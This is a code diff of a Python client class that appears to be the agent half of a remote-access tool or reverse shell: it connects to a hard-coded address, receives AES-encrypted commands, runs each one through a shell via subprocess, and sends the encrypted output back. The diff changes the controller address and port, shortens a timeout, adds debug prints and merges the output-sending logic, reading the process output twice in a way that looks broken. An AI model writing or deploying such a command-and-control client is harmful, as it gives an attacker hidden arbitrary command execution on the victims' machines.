@@ -2,7 +2,6 @@ import os
 import socket
 import subprocess
 from threading import Thread
-
 from helper_methods import *
 
 
@@ -59,6 +58,7 @@ class Client(Thread):
         while True:
             try:
                 command = decrypt_client(self.conn.recv(1024), self.AES_KEY)
+                print(command)
             except ConnectionResetError:
                 self.__init__(self.IP, self.Port)
                 continue
@@ -135,25 +135,27 @@ class Client(Thread):
                 self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
             else:
                 try:
-                    output = subprocess.check_output(command.decode('ISO-8859-1', errors='ignore'), timeout=3,
+                    output = subprocess.check_output(command.decode('ISO-8859-1', errors='ignore'), timeout=0.5,
                                                      shell=True)
+                    print("Output: ", output)
                     self.conn.send(encrypt_client(str(len(output)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
                     self.conn.send(encrypt_client(output, self.AES_KEY))
                 except Exception as e:
                     print(e)
-                    CMD = subprocess.Popen(command.decode('ISO-8859-1', errors='ignore'), shell=True, stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE,
+                    CMD = subprocess.Popen(command.decode('ISO-8859-1', errors='ignore'), shell=True,
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE
                                            )
+                    print(CMD)
                     self.conn.send(
-                        encrypt_client(str(len(encrypt_client(CMD.stdout.read(), self.AES_KEY))).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
-                    self.conn.send(encrypt_client(CMD.stdout.read(), self.AES_KEY))
-                    self.conn.send(
-                        encrypt_client(str(len(encrypt_client(CMD.stderr.read(), self.AES_KEY))).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
-                    self.conn.send(encrypt_client(CMD.stderr.read(), self.AES_KEY))
+                        encrypt_client(
+                            str(len(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))).encode(
+                                'ISO-8859-1', errors='ignore'), self.AES_KEY))
+                    self.conn.send(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))
 
 
 def main():
-    client = Client("10.0.0.10", 8080)
+    client = Client("10.0.0.19", 9999)
     client.run()
 
 
